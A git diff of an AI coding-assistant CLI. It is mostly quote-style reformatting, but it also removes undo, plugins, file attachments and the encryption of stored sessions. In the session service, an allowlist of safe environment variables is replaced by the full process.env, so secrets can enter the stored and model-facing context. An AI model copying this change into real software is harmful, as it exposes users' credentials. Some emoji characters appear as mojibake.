-  addMessage(role: 'user' | 'assistant' | 'system', content: string, metadata?: Record<string, any>): Message {
+  addMessage(
+    role: "user" | "assistant" | "system",
+    content: string,
+    metadata?: Record<string, any>,
+  ): Message {
     if (!this.currentSession) {
-      throw new Error('No active session');
+      throw new Error("No active session");
     }
 
     const message: Message = {
@@ -92,7 +90,7 @@ export class SessionService {
       role,
       content,
       timestamp: new Date(),
-      metadata
+      metadata,
     };
 
     this.currentSession.messages.push(message);
@@ -101,29 +99,6 @@ export class SessionService {
     return message;
   }
 
-  undoLastInteraction(): { removed: Message[] } {
-    if (!this.currentSession) {
-      throw new Error('No active session');
-    }
-
-    if (this.currentSession.messages.length === 0) {
-      throw new Error('No messages to undo.');
-    }
-
-    const removed: Message[] = [];
-    do {
-      const msg = this.currentSession.messages.pop();
-      if (!msg) break;
-      removed.push(msg);
-      if (msg.role === 'user') {
-        break;
-      }
-    } while (this.currentSession.messages.length > 0);
-
-    this.currentSession.updated = new Date();
-    return { removed: removed.reverse() };
-  }
-
   getMessages(): Message[] {
     return this.currentSession?.messages || [];
   }
@@ -143,33 +118,18 @@ export class SessionService {
   async updateContext(): Promise<void> {
     if (!this.currentSession) return;
 
-    const context = await this.contextService.getContext();
+    const context = await contextService.getContext();
     this.currentSession.context = this.convertContextToSessionContext(context);
   }
 
   private convertContextToSessionContext(context: any): SessionContext {
-    // Only allow a safe subset of environment variables
-    const SAFE_ENV_VARS = ['PATH', 'HOME', 'SHELL', 'USER', 'LOGNAME', 'LANG', 'PWD', 'TERM'];
-    const safeEnv: Record<string, string> = {};
-    for (const key of SAFE_ENV_VARS) {
-      if (process.env[key]) safeEnv[key] = process.env[key] as string;
-    }
-    const MAX_PREVIEW = 2000;
     return {
       workingDirectory: context.cwd,
       gitBranch: context.git?.branch,
       gitStatus: context.git?.status,
       projectType: context.project?.type,
       recentCommands: context.history.commands,
-      environment: safeEnv,
-      files: context.files?.map((file: any) => ({
-        path: file.path,
-        size: file.size,
-        updated: file.updated,
-        preview: typeof file.preview === 'string' && file.preview.length > MAX_PREVIEW
-          ? `${file.preview.slice(0, MAX_PREVIEW)}‚Ä¶`
-          : file.preview
-      }))
+      environment: process.env as Record<string, string>,
     };
   }
 
@@ -180,7 +140,7 @@ export class SessionService {
         try {
           await this.saveCurrentSession();
         } catch (error) {
-          console.error('Autosave failed:', error);
+          console.error("Autosave failed:", error);
         }
       }
     }, 30000);
@@ -193,13 +153,16 @@ export class SessionService {
     }
   }
 
-  async exportSession(id: string, format: 'json' | 'markdown' = 'json'): Promise<string> {
+  async exportSession(
+    id: string,
+    format: "json" | "markdown" = "json",
+  ): Promise<string> {
     const session = await this.storage.loadSession(id);
     if (!session) {
-      throw new Error('Session not found');
+      throw new Error("Session not found");
     }
 
-    if (format === 'json') {
+    if (format === "json") {
       return JSON.stringify(session, null, 2);
     } else {
       // Markdown format
@@ -208,7 +171,7 @@ export class SessionService {
       markdown += `Updated: ${session.updated.toLocaleString()}\n\n`;
       markdown += `## Messages\n\n`;
 
-      session.messages.forEach(msg => {
+      session.messages.forEach((msg) => {
         markdown += `### ${msg.role.toUpperCase()} (${msg.timestamp.toLocaleTimeString()})\n\n`;
         markdown += `${msg.content}\n\n`;
         markdown += `---\n\n`;
@@ -230,7 +193,7 @@ export class SessionService {
     let oldestSession: Date | undefined;
     let newestSession: Date | undefined;
 
-    sessions.forEach(session => {
+    sessions.forEach((session) => {
       if (!oldestSession || session.created < oldestSession) {
         oldestSession = session.created;
       }
@@ -251,17 +214,19 @@ export class SessionService {
       totalSessions: sessions.length,
       totalMessages,
       oldestSession,
-      newestSession
+      newestSession,
     };
   }
 
   async cleanup(): Promise<void> {
     this.stopAutosave();
 
-    if (this.currentSession && this.configService.get('session').autosave) {
+    if (this.currentSession && configService.get("session").autosave) {
       await this.saveCurrentSession();
     }
 
     await this.storage.close();
   }
 }
+
+export const sessionService = new SessionService();
diff --git a/warp-cli/src/storage/session.storage.ts b/warp-cli/src/storage/session.storage.ts
deleted file mode 100644
index 985161f..0000000
--- a/warp-cli/src/storage/session.storage.ts
+++ /dev/null
@@ -1,290 +0,0 @@
-import sqlite3 from 'sqlite3';
-import * as path from 'path';
-import * as fs from 'fs';
-import { Session, Message, SessionContext, StorageProvider } from '../types';
-import { encrypt, decrypt } from '../utils/encryption';
-
-export class SessionStorage implements StorageProvider {
-  private db?: sqlite3.Database;
-  private dbPath: string;
-
-  constructor(storagePath: string) {
-    this.dbPath = path.join(storagePath, 'sessions.db');
-  }
-
-  async initialize(): Promise<void> {
-    // Ensure directory exists
-    const dir = path.dirname(this.dbPath);
-    if (!fs.existsSync(dir)) {
-      fs.mkdirSync(dir, { recursive: true });
-    }
-
-    // Open database
-    this.db = await new Promise<sqlite3.Database>((resolve, reject) => {
-      const db = new sqlite3.Database(this.dbPath, (err) => {
-        if (err) reject(err);
-        else resolve(db);
-      });
-    });
-
-    // Create tables
-    await this.createTables();
-  }
-
-  private runAsync(sql: string, params: any[] = []): Promise<void> {
-    return new Promise((resolve, reject) => {
-      this.db!.run(sql, params, (err: Error | null) => {
-        if (err) reject(err);
-        else resolve();
-      });
-    });
-  }
-
-  private getAsync(sql: string, params: any[] = []): Promise<any> {
-    return new Promise((resolve, reject) => {
-      this.db!.get(sql, params, (err: Error | null, row: any) => {
-        if (err) reject(err);
-        else resolve(row);
-      });
-    });
-  }
-
-  private allAsync(sql: string, params: any[] = []): Promise<any[]> {
-    return new Promise((resolve, reject) => {
-      this.db!.all(sql, params, (err: Error | null, rows: any[]) => {
-        if (err) reject(err);
-        else resolve(rows || []);
-      });
-    });
-  }
-
-  private async createTables(): Promise<void> {
-    if (!this.db) throw new Error('Database not initialized');
-
-    await this.runAsync(`
-      CREATE TABLE IF NOT EXISTS sessions (
-        id TEXT PRIMARY KEY,
-        name TEXT NOT NULL,
-        created INTEGER NOT NULL,
-        updated INTEGER NOT NULL,
-        context TEXT,
-        metadata TEXT
-      )
-    `);
-
-    await this.runAsync(`
-      CREATE TABLE IF NOT EXISTS messages (
-        id TEXT PRIMARY KEY,
-        session_id TEXT NOT NULL,
-        role TEXT NOT NULL,
-        content TEXT NOT NULL,
-        timestamp INTEGER NOT NULL,
-        tokens INTEGER,
-        metadata TEXT,
-        FOREIGN KEY (session_id) REFERENCES sessions(id) ON DELETE CASCADE
-      )
-    `);
-
-    await this.runAsync(`
-      CREATE INDEX IF NOT EXISTS idx_messages_session_id
-      ON messages(session_id)
-    `);
-
-    await this.runAsync(`
-      CREATE INDEX IF NOT EXISTS idx_messages_timestamp
-      ON messages(timestamp)
-    `);
-
-    await this.runAsync(`
-      CREATE VIRTUAL TABLE IF NOT EXISTS sessions_fts
-      USING fts5(name, content)
-    `);
-  }
-
-  async saveSession(session: Session): Promise<void> {
-    if (!this.db) throw new Error('Database not initialized');
-
-    // Save session
-    await this.runAsync(
-      `INSERT OR REPLACE INTO sessions (id, name, created, updated, context, metadata)
-       VALUES (?, ?, ?, ?, ?, ?)`,
-      [
-        session.id,
-        session.name,
-        session.created.getTime(),
-        session.updated.getTime(),
-        this.encryptJson(session.context),
-        this.encryptJson(session.metadata)
-      ]
-    );
-
-    // Delete existing messages for this session
-    await this.runAsync(`DELETE FROM messages WHERE session_id = ?`, [session.id]);
-
-    // Save messages
-    for (const message of session.messages) {
-      await this.runAsync(
-        `INSERT INTO messages (id, session_id, role, content, timestamp, tokens, metadata)
-         VALUES (?, ?, ?, ?, ?, ?, ?)`,
-        [
-          message.id,
-          session.id,
-          message.role,
-          message.content,
-          message.timestamp.getTime(),
-          message.tokens || null,
-          this.encryptJson(message.metadata)
-        ]
-      );
-    }
-
-    // Update FTS index
-    await this.runAsync(
-      `INSERT OR REPLACE INTO sessions_fts (rowid, name, content)
-       VALUES (
-         (SELECT rowid FROM sessions WHERE id = ?),
-         ?,
-         ?
-       )`,
-      [session.id, session.name, session.messages.map(m => m.content).join(' ')]
-    );
-  }
-
-  async loadSession(id: string): Promise<Session | null> {
-    if (!this.db) throw new Error('Database not initialized');
-
-    // Load session
-    const sessionRow: any = await this.getAsync(
-      `SELECT * FROM sessions WHERE id = ?`,
-      [id]
-    );
-
-    if (!sessionRow) return null;
-
-    // Load messages
-    const messageRows: any[] = await this.allAsync(
-      `SELECT * FROM messages WHERE session_id = ? ORDER BY timestamp ASC`,
-      [id]
-    );
-
-    const messages: Message[] = messageRows.map(row => ({
-      id: row.id,
-      role: row.role,
-      content: row.content,
-      timestamp: new Date(row.timestamp),
-      tokens: row.tokens || undefined,
-      metadata: this.decryptJson(row.metadata)
-    }));
-
-    return {
-      id: sessionRow.id,
-      name: sessionRow.name,
-      created: new Date(sessionRow.created),
-      updated: new Date(sessionRow.updated),
-      messages,
-      context: this.decryptContext(sessionRow.context),
-      metadata: this.decryptJson(sessionRow.metadata)
-    };
-  }
-
-  async listSessions(): Promise<Session[]> {
-    if (!this.db) throw new Error('Database not initialized');
-
-    const rows: any[] = await this.allAsync(
-      `SELECT id, name, created, updated, context, metadata
-       FROM sessions
-       ORDER BY updated DESC`
-    );
-
-    return rows.map(row => ({
-      id: row.id,
-      name: row.name,
-      created: new Date(row.created),
-      updated: new Date(row.updated),
-      messages: [], // Don't load messages for list view
-      context: this.decryptContext(row.context),
-      metadata: this.decryptJson(row.metadata)
-    }));
-  }
-
-  async deleteSession(id: string): Promise<void> {
-    if (!this.db) throw new Error('Database not initialized');
-
-    await this.runAsync(`DELETE FROM messages WHERE session_id = ?`, [id]);
-    await this.runAsync(`DELETE FROM sessions WHERE id = ?`, [id]);
-    await this.runAsync(
-      `DELETE FROM sessions_fts WHERE rowid = (
-        SELECT rowid FROM sessions WHERE id = ?
-      )`,
-      [id]
-    );
-  }
-
-  async searchSessions(query: string): Promise<Session[]> {
-    if (!this.db) throw new Error('Database not initialized');
-
-    const rows: any[] = await this.allAsync(
-      `SELECT s.id, s.name, s.created, s.updated, s.context, s.metadata
-       FROM sessions s
-       JOIN sessions_fts fts ON s.rowid = fts.rowid
-       WHERE sessions_fts MATCH ?
-       ORDER BY rank`,
-      [query]
-    );
-
-    return rows.map(row => ({
-      id: row.id,
-      name: row.name,
-      created: new Date(row.created),
-      updated: new Date(row.updated),
-      messages: [],
-      context: this.decryptContext(row.context),
-      metadata: this.decryptJson(row.metadata)
-    }));
-  }
-
-  async close(): Promise<void> {
-    if (this.db) {
-      await new Promise<void>((resolve, reject) => {
-        this.db!.close((err) => {
-          if (err) reject(err);
-          else resolve();
-        });
-      });
-    }
-  }
-
-  private encryptJson(value?: Record<string, any> | SessionContext | null): string | null {
-    if (value === undefined || value === null) {
-      return null;
-    }
-    return encrypt(JSON.stringify(value));
-  }
-
-  private decryptJson<T = Record<string, any>>(value?: string | null): T | undefined {
-    if (!value) return undefined;
-    try {
-      return JSON.parse(this.safeDecrypt(value)) as T;
-    } catch {
-      return undefined;
-    }
-  }
-
-  private decryptContext(value?: string | null): SessionContext {
-    const context = value ? this.decryptJson<SessionContext>(value) : undefined;
-    if (context) return context;
-    return {
-      workingDirectory: '',
-      recentCommands: [],
-      environment: {}
-    };
-  }
-
-  private safeDecrypt(value: string): string {
-    try {
-      return decrypt(value);
-    } catch {
-      return value;
-    }
-  }
-}
diff --git a/warp-cli/src/types.ts b/warp-cli/src/types.ts
index 6bc2219..c0e7d51 100644
--- a/warp-cli/src/types.ts
+++ b/warp-cli/src/types.ts
@@ -1,12 +1,37 @@
 // Core Types for Warp CLI
 
+export interface JsonObject {
+  [key: string]: JsonValue;
+}
+
+export type JsonPrimitive = string | number | boolean | null;
+export type JsonValue = JsonPrimitive | JsonValue[] | JsonObject;
+
+export interface ToolCall {
+  name: string;
+  args: Record<string, JsonValue>;
+}
+
+export interface ChatOptions {
+  streaming?: boolean;
+  model?: string;
+  temperature?: number;
+}
+
+export interface ProviderConfig {
+  model: string;
+  apiKey?: string;
+  endpoint?: string;
+  temperature?: number;
+}
+
 export interface Message {
   id: string;
-  role: 'user' | 'assistant' | 'system';
+  role: "user" | "assistant" | "system";
   content: string;
   timestamp: Date;
   tokens?: number;
-  metadata?: Record<string, any>;
+  metadata?: Record<string, unknown>;
 }
 
 export interface Session {
@@ -16,7 +41,7 @@ export interface Session {
   updated: Date;
   messages: Message[];
   context: SessionContext;
-  metadata?: Record<string, any>;
+  metadata?: Record<string, unknown>;
 }
 
 export interface SessionContext {
@@ -26,22 +51,7 @@ export interface SessionContext {
   projectType?: string;
   recentCommands: string[];
   environment: Record<string, string>;
-  files?: ContextFileAttachment[];
-}
-
-export interface ContextFileAttachment {
-  path: string;
-  size: number;
-  preview: string;
-  updated: string;
-}
-
-export type ProviderName = 'ollama' | 'openai' | 'anthropic' | 'gemini';
-
-export interface ProviderSettings {
-  model?: string;
-  endpoint?: string;
-  apiKey?: string;
+  files?: string[];
 }
 
 export interface LLMConfig {
@@ -54,11 +64,30 @@ export interface LLMConfig {
   topP?: number;
 }
 
+export type ProviderName = "ollama" | "openai" | "anthropic" | "gemini";
+
 export interface Config {
-  defaultProvider: ProviderName;
-  providers: Partial<Record<ProviderName, ProviderSettings>>;
+  defaultProvider: "ollama" | "openai" | "anthropic" | "gemini";
+  providers: {
+    ollama?: {
+      endpoint: string;
+      model: string;
+    };
+    openai?: {
+      apiKey: string;
+      model: string;
+    };
+    anthropic?: {
+      apiKey: string;
+      model: string;
+    };
+    gemini?: {
+      apiKey: string;
+      model: string;
+    };
+  };
   ui: {
-    theme: 'dark' | 'light';
+    theme: "dark" | "light";
     markdown: boolean;
     streaming: boolean;
   };
@@ -78,7 +107,10 @@ export interface LLMProvider {
   name: string;
   initialize(config: LLMConfig): Promise<void>;
   chat(messages: Message[], config?: Partial<LLMConfig>): Promise<string>;
-  streamChat?(messages: Message[], config?: Partial<LLMConfig>): AsyncGenerator<string>;
+  streamChat?(
+    messages: Message[],
+    config?: Partial<LLMConfig>,
+  ): AsyncGenerator<string>;
   isAvailable(): Promise<boolean>;
 }
 
@@ -104,7 +136,6 @@ export interface ContextData {
     commands: string[];
     outputs: string[];
   };
-  files?: ContextFileAttachment[];
 }
 
 export interface CommandResult {
@@ -123,27 +154,6 @@ export interface StorageProvider {
   searchSessions(query: string): Promise<Session[]>;
 }
 
-export interface PluginRunResult {
-  output?: string;
-  highlights?: string[];
-  metadata?: Record<string, any>;
-}
-
-export interface WarpPlugin {
-  name: string;
-  description: string;
-  version?: string;
-  author?: string;
-  run(args: string[], context: ContextData): Promise<PluginRunResult | string> | PluginRunResult | string;
-}
-
-export interface PluginSummary {
-  name: string;
-  description: string;
-  version?: string;
-  source: 'builtin' | 'external';
-}
-
 export interface UIRenderer {
   renderWelcome(): void;
   renderPrompt(mode: string): void;
diff --git a/warp-cli/src/ui/renderer.ts b/warp-cli/src/ui/renderer.ts
index c0dc92a..65a311a 100644
--- a/warp-cli/src/ui/renderer.ts
+++ b/warp-cli/src/ui/renderer.ts
@@ -1,30 +1,42 @@
-import chalk from 'chalk';
-import boxen from 'boxen';
-import Table from 'cli-table3';
-import ora, { Ora } from 'ora';
-import { Message, UIRenderer } from '../types';
-import gradient from 'gradient-string';
-import highlight from 'cli-highlight';
-
-// Updated markdown formatter with syntax highlighting
+import chalk from "chalk";
+import boxen from "boxen";
+import Table from "cli-table3";
+import ora, { Ora } from "ora";
+import { Message, UIRenderer } from "../types";
+
+// Simple markdown-like formatting
 function formatMarkdown(text: string): string {
   let formatted = text;
 
-  // Code blocks with syntax highlighting
-  formatted = formatted.replace(/```(\w+)?\n([\s\S]*?)```/g, (_, lang, code) => {
-    const highlightedCode = highlight(code.trim(), { language: lang || 'plaintext', ignoreIllegals: true });
-    return '\n' + chalk.gray('```') + (lang ? chalk.yellow(lang) : '') + '\n' +
-           highlightedCode + '\n' + chalk.gray('```') + '\n';
-  });
+  // Code blocks
+  formatted = formatted.replace(
+    /```(\w+)?\n([\s\S]*?)```/g,
+    (_, lang, code) => {
+      return (
+        "\n" +
+        chalk.gray("```") +
+        (lang ? chalk.yellow(lang) : "") +
+        "\n" +
+        chalk.white(code.trim()) +
+        "\n" +
+        chalk.gray("```") +
+        "\n"
+      );
+    },
+  );
 
   // Inline code
   formatted = formatted.replace(/`([^`]+)`/g, (_, code) => chalk.cyan(code));
 
   // Bold
-  formatted = formatted.replace(/\*\*([^*]+)\*\*/g, (_, text) => chalk.bold(text));
+  formatted = formatted.replace(/\*\*([^*]+)\*\*/g, (_, text) =>
+    chalk.bold(text),
+  );
 
   // Italic (single asterisk not already part of bold)
-  formatted = formatted.replace(/(?<!\*)\*([^*]+)\*(?!\*)/g, (_, text) => chalk.italic(text));
+  formatted = formatted.replace(/(?<!\*)\*([^*]+)\*(?!\*)/g, (_, text) =>
+    chalk.italic(text),
+  );
 
   return formatted;
 }
@@ -32,46 +44,44 @@ function formatMarkdown(text: string): string {
 export class WarpUIRenderer implements UIRenderer {
   private spinner?: Ora;
 
-  setTheme(_theme: 'dark' | 'light'): void {
+  setTheme(): void {
     // Theme support can be added later
   }
 
   renderWelcome(): void {
-    const logo = gradient('cyan', 'pink').multiline(
-      `
+    const logo = `
  __      __  ___ ______  _____
- \ \    / / / _ \| ___ \|  __ \\
-  \ \  / / / /_\\ \ |_/ /| |__) |
-   \ \/ /  |  _  ||    / |  ___/
-    \  /   | | | || |\\ \ | |
-     \/    \_| |_/\_| \_||_|
+ \\ \\    / / / _ \\| ___ \\|  __ \\
+  \\ \\  / / / /_\\ \\ |_/ /| |__) |
+   \\ \\/ /  |  _  ||    / |  ___/
+    \\  /   | | | || |\\ \\ | |
+     \\/    \\_| |_/\\_| \\_||_|
 
-    AI Coding Assistant CLI`
-    );
+    AI Coding Assistant CLI
+    `;
 
-    console.log(logo);
+    console.log(chalk.cyan(logo));
     console.log(
       boxen(
         chalk.white(
-          'Welcome to Warp CLI!\n\n' +
-            'A powerful AI coding assistant supporting multiple LLM providers.\n' +
-            'Type your questions, execute commands, or use /help for assistance.'
+          "Welcome to Warp CLI!\n\n" +
+            "A powerful AI coding assistant supporting multiple LLM providers.\n" +
+            "Type your questions, execute commands, or use /help for assistance.",
         ),
         {
           padding: 1,
           margin: 1,
-          borderStyle: 'round',
-          borderColor: 'cyan'
-        }
-      )
+          borderStyle: "round",
+          borderColor: "cyan",
+        },
+      ),
     );
   }
 
-  renderPrompt(mode: string = 'chat'): void {
-    const gradientPrompt = gradient('cyan', 'magenta');
-    const modeLabel = gradientPrompt(mode.toUpperCase());
-    const symbol = mode === 'chat' ? 'üí¨' : '‚öôÔ∏è';
-    process.stdout.write(`\n${symbol}  ${modeLabel} ${chalk.gray('>')} `);
+  renderPrompt(mode: string = "chat"): void {
+    const modeColor = mode === "chat" ? chalk.cyan : chalk.yellow;
+    const symbol = mode === "chat" ? "üí¨" : "‚öôÔ∏è";
+    process.stdout.write(`\n${symbol}  ${modeColor(mode)} ${chalk.gray(">")} `);
   }
 
   renderMessage(message: Message): void {
@@ -79,48 +89,64 @@ export class WarpUIRenderer implements UIRenderer {
     const roleColors = {
       user: chalk.cyan,
       assistant: chalk.green,
-      system: chalk.yellow
+      system: chalk.yellow,
     };
 
     const roleEmoji = {
-      user: 'üë§',
-      assistant: 'ü§ñ',
-      system: '‚öôÔ∏è'
+      user: "üë§",
+      assistant: "ü§ñ",
+      system: "‚öôÔ∏è",
     };
 
+    const roleColor = roleColors[message.role];
+    const emoji = roleEmoji[message.role];
+
+    console.log("\n" + chalk.gray("‚îÄ".repeat(process.stdout.columns || 80)));
     console.log(
-      `${chalk.gray(`[${timestamp}]`)} ${roleEmoji[message.role]} ${roleColors[message.role](message.role)}: ${formatMarkdown(message.content)}`
+      `${emoji}  ${roleColor.bold(message.role.toUpperCase())} ${chalk.gray(
+        `[${timestamp}]`,
+      )}`,
     );
+
+    if (message.tokens) {
+      console.log(chalk.gray(`   Tokens: ${message.tokens}`));
+    }
+
+    console.log();
+
+    // Render content with markdown-like formatting
+    const rendered = formatMarkdown(message.content);
+    console.log(rendered);
   }
 
   renderError(error: string): void {
     console.log(
-      boxen(chalk.red.bold('ERROR\n\n') + chalk.white(error), {
+      boxen(chalk.red.bold("ERROR\n\n") + chalk.white(error), {
         padding: 1,
         margin: 1,
-        borderStyle: 'round',
-        borderColor: 'red'
-      })
+        borderStyle: "round",
+        borderColor: "red",
+      }),
     );
   }
 
   renderSuccess(message: string): void {
     console.log(
-      boxen(chalk.green.bold('SUCCESS\n\n') + chalk.white(message), {
+      boxen(chalk.green.bold("SUCCESS\n\n") + chalk.white(message), {
         padding: 1,
         margin: 1,
-        borderStyle: 'round',
-        borderColor: 'green'
-      })
+        borderStyle: "round",
+        borderColor: "green",
+      }),
     );
   }
 
   renderInfo(message: string): void {
-    console.log(chalk.blue('‚Ñπ'), chalk.white(message));
+    console.log(chalk.blue("‚Ñπ"), chalk.white(message));
   }
 
   renderWarning(message: string): void {
-    console.log(chalk.yellow('‚ö†'), chalk.white(message));
+    console.log(chalk.yellow("‚ö†"), chalk.white(message));
   }
 
   renderLoading(text: string): void {
@@ -129,8 +155,8 @@ export class WarpUIRenderer implements UIRenderer {
     }
     this.spinner = ora({
       text: chalk.cyan(text),
-      color: 'cyan',
-      spinner: 'dots'
+      color: "cyan",
+      spinner: "dots",
     }).start();
   }
 
@@ -143,64 +169,54 @@ export class WarpUIRenderer implements UIRenderer {
 
   renderTable(headers: string[], rows: string[][]): void {
     const table = new Table({
-      head: headers.map(h => chalk.cyan.bold(h)),
+      head: headers.map((h) => chalk.cyan.bold(h)),
       style: {
         head: [],
-        border: ['gray']
-      }
+        border: ["gray"],
+      },
     });
 
-    rows.forEach(row => table.push(row));
+    rows.forEach((row) => table.push(row));
     console.log(table.toString());
   }
 
-  renderBox(title: string, content: string, options?: { color?: string }): void {
-    const borderColor = (options?.color as any) || 'white';
+  renderBox(
+    title: string,
+    content: string,
+    options?: { color?: string },
+  ): void {
+    const borderColor = options?.color ?? "white";
     console.log(
-      boxen(chalk.bold(title) + '\n\n' + content, {
+      boxen(chalk.bold(title) + "\n\n" + content, {
         padding: 1,
         margin: 1,
-        borderStyle: 'round',
-        borderColor
-      })
+        borderStyle: "round",
+        borderColor,
+      }),
     );
   }
 
   renderCodeBlock(code: string, language?: string): void {
-    const languageLabel = language ? chalk.gray(`[${language}]`) : chalk.gray('[code]');
-    const highlighted = highlight(code, {
-      language: language || 'plaintext',
-      ignoreIllegals: true,
-      theme: {
-        keyword: chalk.cyan,
-        built_in: chalk.magenta,
-        literal: chalk.blue,
-        string: chalk.green,
-        number: chalk.yellow,
-        comment: chalk.gray,
-        meta: chalk.cyanBright
-      }
-    });
-
-    console.log('\n' + languageLabel);
+    const languageLabel = language ? chalk.gray(`[${language}]`) : "";
+    console.log("\n" + languageLabel);
     console.log(
-      boxen(highlighted, {
+      boxen(code, {
         padding: 1,
-        borderStyle: 'round',
-        borderColor: 'gray'
-      })
+        borderStyle: "round",
+        borderColor: "gray",
+      }),
     );
   }
 
   renderList(items: string[], numbered: boolean = false): void {
     items.forEach((item, index) => {
-      const prefix = numbered ? chalk.cyan(`${index + 1}.`) : chalk.cyan('‚Ä¢');
+      const prefix = numbered ? chalk.cyan(`${index + 1}.`) : chalk.cyan("‚Ä¢");
       console.log(`  ${prefix} ${item}`);
     });
   }
 
   renderDivider(): void {
-    console.log(chalk.gray('‚îÄ'.repeat(process.stdout.columns || 80)));
+    console.log(chalk.gray("‚îÄ".repeat(process.stdout.columns || 80)));
   }
 
   renderStreamingChunk(chunk: string): void {
@@ -212,62 +228,58 @@ export class WarpUIRenderer implements UIRenderer {
   }
 
   endStreamingResponse(): void {
-    console.log('\n');
+    console.log("\n");
   }
 
   clear(): void {
     console.clear();
   }
 
-  renderSessionInfo(session: { name: string; messageCount: number; created: Date }): void {
+  renderSessionInfo(session: {
+    name: string;
+    messageCount: number;
+    created: Date;
+  }): void {
     const info = [
       `Session: ${chalk.cyan(session.name)}`,
       `Messages: ${chalk.yellow(session.messageCount)}`,
-      `Created: ${chalk.gray(session.created.toLocaleString())}`
-    ].join(' | ');
+      `Created: ${chalk.gray(session.created.toLocaleString())}`,
+    ].join(" | ");
 
     console.log(
       boxen(info, {
         padding: { left: 2, right: 2, top: 0, bottom: 0 },
-        borderStyle: 'single',
-        borderColor: 'cyan'
-      })
+        borderStyle: "single",
+        borderColor: "cyan",
+      }),
     );
   }
 
   renderHelp(): void {
     const helpText = `
-${chalk.bold.cyan('WARP CLI - Commands')}
-
-${chalk.bold('Chat Commands:')}
-  ${chalk.cyan('/help')}              Show this help message
-  ${chalk.cyan('/clear')}             Clear the screen
-  ${chalk.cyan('/exit, /quit')}       Exit the application
-  ${chalk.cyan('/new')}               Start a new session
-  ${chalk.cyan('/save [name]')}       Save current session
-  ${chalk.cyan('/load <id>')}         Load a session
-  ${chalk.cyan('/list')}              List all sessions
-  ${chalk.cyan('/delete <id>')}       Delete a session
-  ${chalk.cyan('/undo')}              Undo the last chat interaction
-
-${chalk.bold('Configuration:')}
-  ${chalk.cyan('/config')}            Show current configuration
-  ${chalk.cyan('/provider <name>')}  Switch LLM provider (ollama, openai, anthropic, gemini)
-  ${chalk.cyan('/model <name>')}     Set model for current provider
-  ${chalk.cyan('/context')}          Show current context
-  ${chalk.cyan('/ctxfile <cmd>')}    Manage attached context files (add/remove/list)
-
-${chalk.bold('Execution:')}
-  ${chalk.cyan('/exec <command>')}   Execute a shell command
-  ${chalk.cyan('/git <args>')}       Execute git command
-  ${chalk.cyan('/diff [--staged]')}  Show git diff for current repo
-
-${chalk.bold('Plugins & Tools:')}
-  ${chalk.cyan('/plugins')}          List installed plugins
-  ${chalk.cyan('/plugin <name>')}    Run a plugin with optional arguments
-  ${chalk.cyan('/autocomplete <p>')} Suggest commands/plugins for a prefix
-
-${chalk.bold('Tips:')}
+${chalk.bold.cyan("WARP CLI - Commands")}
+
+${chalk.bold("Chat Commands:")}
+  ${chalk.cyan("/help")}              Show this help message
+  ${chalk.cyan("/clear")}             Clear the screen
+  ${chalk.cyan("/exit, /quit")}       Exit the application
+  ${chalk.cyan("/new")}               Start a new session
+  ${chalk.cyan("/save [name]")}       Save current session
+  ${chalk.cyan("/load <id>")}         Load a session
+  ${chalk.cyan("/list")}              List all sessions
+  ${chalk.cyan("/delete <id>")}       Delete a session
+
+${chalk.bold("Configuration:")}
+  ${chalk.cyan("/config")}            Show current configuration
+  ${chalk.cyan("/provider <name>")}  Switch LLM provider (ollama, openai, anthropic, gemini)
+  ${chalk.cyan("/model <name>")}     Set model for current provider
+  ${chalk.cyan("/context")}          Show current context
+
+${chalk.bold("Execution:")}
+  ${chalk.cyan("/exec <command>")}   Execute a shell command
+  ${chalk.cyan("/git <args>")}       Execute git command
+
+${chalk.bold("Tips:")}
   ‚Ä¢ Just type naturally to chat with the AI
   ‚Ä¢ Use markdown for formatted output
   ‚Ä¢ Press Ctrl+C to cancel current operation
@@ -278,12 +290,13 @@ ${chalk.bold('Tips:')}
   }
 
   getInput(prompt: string): Promise<string> {
-    return new Promise(resolve => {
+    return new Promise((resolve) => {
       process.stdout.write(prompt);
-      process.stdin.once('data', data => {
+      process.stdin.once("data", (data) => {
         resolve(data.toString().trim());
       });
     });
   }
 }
 
+export const uiRenderer = new WarpUIRenderer();
diff --git a/warp-cli/src/utils/encryption.ts b/warp-cli/src/utils/encryption.ts
deleted file mode 100644
index 22e1c5a..0000000
--- a/warp-cli/src/utils/encryption.ts
+++ /dev/null
@@ -1,71 +0,0 @@
-import * as crypto from 'crypto';
-import * as fs from 'fs';
-import * as os from 'os';
-import * as path from 'path';
-
-const ALGORITHM = 'aes-256-gcm';
-const IV_LENGTH = 12; // Recommended for GCM
-const KEY_LENGTH = 32; // 256 bits
-const KEY_FILE = path.join(os.homedir(), '.warp-cli', '.session-key');
-
-function ensureDirectory(): void {
-  const dir = path.dirname(KEY_FILE);
-  if (!fs.existsSync(dir)) {
-    fs.mkdirSync(dir, { recursive: true });
-  }
-}
-
-function normalizeEnvKey(key: string): Buffer {
-  if (key.length === KEY_LENGTH) {
-    return Buffer.from(key, 'utf8');
-  }
-  try {
-    const decoded = Buffer.from(key, 'base64');
-    if (decoded.length === KEY_LENGTH) {
-      return decoded;
-    }
-  } catch {
-    // Fall through to hash-based derivation
-  }
-  return crypto.createHash('sha256').update(key).digest().subarray(0, KEY_LENGTH);
-}
-
-function getKey(): Buffer {
-  const envKey = process.env.WARP_SESSION_KEY;
-  if (envKey) {
-    return normalizeEnvKey(envKey);
-  }
-
-  ensureDirectory();
-
-  if (fs.existsSync(KEY_FILE)) {
-    const data = fs.readFileSync(KEY_FILE, 'utf8').trim();
-    return Buffer.from(data, 'base64');
-  }
-
-  const key = crypto.randomBytes(KEY_LENGTH);
-  fs.writeFileSync(KEY_FILE, key.toString('base64'), { mode: 0o600 });
-  return key;
-}
-
-export function encrypt(text: string): string {
-  const iv = crypto.randomBytes(IV_LENGTH);
-  const key = getKey();
-  const cipher = crypto.createCipheriv(ALGORITHM, key, iv);
-  let encrypted = cipher.update(text, 'utf8', 'base64');
-  encrypted += cipher.final('base64');
-  const tag = cipher.getAuthTag();
-  return [iv.toString('base64'), tag.toString('base64'), encrypted].join(':');
-}
-
-export function decrypt(data: string): string {
-  const [ivB64, tagB64, encrypted] = data.split(':');
-  const iv = Buffer.from(ivB64, 'base64');
-  const tag = Buffer.from(tagB64, 'base64');
-  const key = getKey();
-  const decipher = crypto.createDecipheriv(ALGORITHM, key, iv);
-  decipher.setAuthTag(tag);
-  let decrypted = decipher.update(encrypted, 'base64', 'utf8');
-  decrypted += decipher.final('utf8');
-  return decrypted;
-}
diff --git a/warp-cli/tsconfig.json b/warp-cli/tsconfig.json
index 98af6bc..ccd185a 100644
--- a/warp-cli/tsconfig.json
+++ b/warp-cli/tsconfig.json
